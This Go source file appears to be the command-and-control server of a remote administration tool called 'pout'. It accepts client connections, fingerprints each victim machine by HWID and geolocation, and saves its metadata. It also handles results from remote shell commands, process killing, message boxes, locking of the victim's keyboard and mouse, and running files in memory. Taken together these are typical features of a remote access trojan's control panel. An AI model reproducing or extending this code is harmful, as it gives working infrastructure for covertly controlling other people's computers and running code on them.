package server

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"sync"
	"time"

	"github.com/codeuk/pout/cmd/helper"
	"github.com/codeuk/pout/cmd/network"
	"github.com/codeuk/pout/cmd/system"
)

// `Server` represents the TCP socket server.
type Server struct {
	Listener    net.Listener
	Connections []*Client
	Mutex       sync.Mutex
	Logs        helper.Logs
	Graph       TimeGraph
	Notify      bool

	SentBytes int
	RecvBytes int
}

// Create a new Server instance.
var CurrentServer = NewServer()

// `NewServer` creates and returns a new Server instance.
func NewServer() *Server {
	return &Server{
		Connections: make([]*Client, 0),
		Notify:      true,
	}
}

// `Server.Run` starts the server and listens for incoming connections on the passed port.
func (s *Server) Run(port string) error {
	// Create and start the connection listener.
	ln, err := net.Listen("tcp", fmt.Sprintf(":%s", port))
	if err != nil {
		s.Logs.Add(fmt.Sprintf("Failed to start server: %s", err.Error()))

		return err
	}
	s.Listener = ln
	defer s.Listener.Close()

	// Push a new Windows toast notification.
	if s.Notify {
		go helper.ServerStartedNotification(port)
	}

	// Add log for starting the server and listening process.
	s.Logs.Add(fmt.Sprintf("Listening on port %s...\n", port))

	// Continually accept incoming connections.
	for {
		conn, err := s.Listener.Accept()
		if err != nil {
			s.Logs.Add(fmt.Sprintf("Failed to accept incoming connection: %s\n", err.Error()))
			continue
		}

		// Create a new Client instance containing connection information.
		c := &Client{
			Parent:         s,
			SessionID:      "",
			Conn:           conn,
			RawAddr:        conn.RemoteAddr().String(),
			Connected:      time.Now(),
			ProcessMonitor: ProcessMonitor{ProcessUpdateTime: 1000},
		}

		// Recieve, parse and format the recieved client information.

		// Read the JSON Marshal from the client.
		data, err := c.ReadAll()
		if err != nil {
			continue
		}

		// Deserialize the received data into an MetaData struct.
		err = json.Unmarshal([]byte(data), &c.MetaData)
		if err != nil {
			s.Logs.Add(fmt.Sprintf("Failed to deserialize data for %s: %s\n", c.RawAddr, err.Error()))
		}

		if c.MetaData.System.Registry.HWID == "Unknown" || c.MetaData.System.Registry.HWID == "" {
			// Generate a new SessionID for the connection if the passed HWID is invalid.
			c.SessionID = helper.GenerateSessionKey(10)
		} else {
			// Use the machines HWID as the SessionID for the connection.
			c.SessionID = c.MetaData.System.Registry.HWID
		}

		// Add information to the MetaData that can be gathered server-side.
		c.MetaData.Geo, err = network.GetGeoLocation(c.MetaData.IP)
		if err != nil {
			s.Logs.Add(fmt.Sprintf("Failed to get GeoLocation data for %s: %s\n", c.RawAddr, err.Error()))
		}

		// Add the new connection to the connections array.
		s.Add(c)

		// Start a new goroutine to handle the connection.
		go s.Handle(c)
	}
}

// `Server.Handle` handles incoming data from the passed client connection.
func (s *Server) Handle(c *Client) {
	// Continually read incoming data from the client.
readLoop:
	for {
		// Read the formatted Message from the client.
		message, err := c.ReadMessage()
		if err != nil {
			// The client has timed out, so we will break the reading loop.
			// This will in turn close the client connection.
			break readLoop
		}

		// Most cases will use the content recieved from the client in its string form.
		contentStr := string(message.Content)

		// Verify the packet's header and handle accordingly.
	messageHandler:
		switch message.Header {

		case HD_ERROR:
			// Format the error recieved and add it to the server logs.
			s.Logs.Add(fmt.Sprintf("Error from %s: %s\n", c.RawAddr, contentStr))

		case HD_SHELL:
			// Pass the recieved data to the Remote Shell output.
			c.CmdData.CommandOutput = contentStr

		case HD_PROCESSES:
			// Format the recieved data into the clients stored Processes.
			err = json.Unmarshal(message.Content, &c.MetaData.Processes)
			if err != nil {
				// The process list recieved could not be read into the client's Processes.
				// The command reading loop will continue for this client, as it was just an invalid message.
				break messageHandler
			}

			// Update the clients LastUpdatedProcesses time.
			// Without this, the client would send the process list at every opportunity, which would overload it.
			c.ProcessMonitor.LastUpdatedProcesses = time.Now()

		case HD_KILL_PROC:
			// Add whether the process was killed or not to the server logs.
			s.Logs.Add(fmt.Sprintf("Killed Process for %s: %s\n", c.RawAddr, contentStr))
			c.ProcessMonitor.KillingProcess = false

		case HD_MSG_BOX:
			// Add whether the message box was displayed or not to the server logs.
			s.Logs.Add(fmt.Sprintf("Displayed Message Box for %s: %s\n", c.RawAddr, contentStr))

		case HD_INPUT_ON:
			// Add whether the inputs were unlocked successfully or not to the server logs.
			s.Logs.Add(fmt.Sprintf("Input Unlocked for %s: %s\n", c.RawAddr, contentStr))
			c.InputLocked = !(contentStr == "true")

		case HD_INPUT_OFF:
			// Add whether the inputs were locked successfully or not to the server logs.
			s.Logs.Add(fmt.Sprintf("Input Locked for %s: %s\n", c.RawAddr, contentStr))
			c.InputLocked = contentStr == "true"

		case HD_RUN_FILE:
			// Add whether the file was executed in memory successfully.
			s.Logs.Add(fmt.Sprintf("File ran for %s: %s\n", c.RawAddr, contentStr))

		default:
			// Log that the server has recieved an invalid packet from the client.
			s.Logs.Add(fmt.Sprintf("Invalid packet from: %s\n", c.RawAddr))
		}
	}

	// The client has encountered an error or has been told to exit, so we can now close it.
	s.Remove(c)
}

// `Server.Add` adds the passed client connection to the connections array of the server,
// updates the connection graph, creates a new client folder with an overview Json file
// and pushes a Windows toast notification if it's set in the server config.
func (s *Server) Add(c *Client) {
	// Lock the Server Mutex and add the connection to the connections array.
	s.Mutex.Lock()
	s.Connections = append(s.Connections, c)
	s.Mutex.Unlock()

	// Push a new Windows toast notification for the new client.
	if s.Notify {
		go helper.NewClientNotification(c.RawAddr)
	}

	// Add the new connection to the server logs.
	s.Logs.Add(fmt.Sprintf("New connection from %s\n", c.RawAddr))

	// Update the connection graph to include the new connection.
	s.Graph.UpdateConnectionGraph(c)

	// Create a new user data folder to store the new connections data.
	c.UserDataPath = system.CleanPath(system.DataPath + fmt.Sprintf("%s\\", c.SessionID))

	if _, err := os.Stat(c.UserDataPath); os.IsNotExist(err) {
		// If the folder doesn't exist, create it.
		if os.Mkdir(c.UserDataPath, 0666) != nil {
			return
		}
	} else {
		// If the folder already exists, do nothing.
		return
	}

	// Write the clients MetaData to the user data path in JSON format.
	overviewFile := system.File{Path: system.CleanPath(
		c.UserDataPath + "\\overview.json",
	)}
	overviewFile.WriteJson(c.MetaData)
	overviewFile.Move(c.UserDataPath)
}

// `Server.Remove` removes and closes the passed client connection.
// The function removes the passed client from the Server's connections array,
// and closes the client's socket connection.
func (s *Server) Remove(c *Client) {
	// Lock the Server Mutex and remove the connection from the connections array.
	s.Mutex.Lock()
	for i, conn := range s.Connections {
		if conn == c {
			s.Connections = append(s.Connections[:i], s.Connections[i+1:]...)
			break
		}
	}
	s.Mutex.Unlock()

	// Close the socket connection.
	c.SendMessage(Message{Header: HD_EXIT})
	c.Conn.Close()

	// Add the closing of the connection of the client to the server logs.
	s.Logs.Add(fmt.Sprintf("Closed %s\n", c.Conn.RemoteAddr().String()))
}

// Header packets for identifying the data recieved from the server.
const (
	HD_EXIT   byte = 0x10
	HD_REMAKE byte = 0x20
	HD_ERROR  byte = 0x30

	HD_SHELL     byte = 0x01
	HD_PROCESSES byte = 0x02
	HD_KILL_PROC byte = 0x03
	HD_MSG_BOX   byte = 0x04
	HD_INPUT_ON  byte = 0x05
	HD_INPUT_OFF byte = 0x06
	HD_RUN_FILE  byte = 0x07
)

// Standard request buffer size.
const STD_BUFFER = 1024
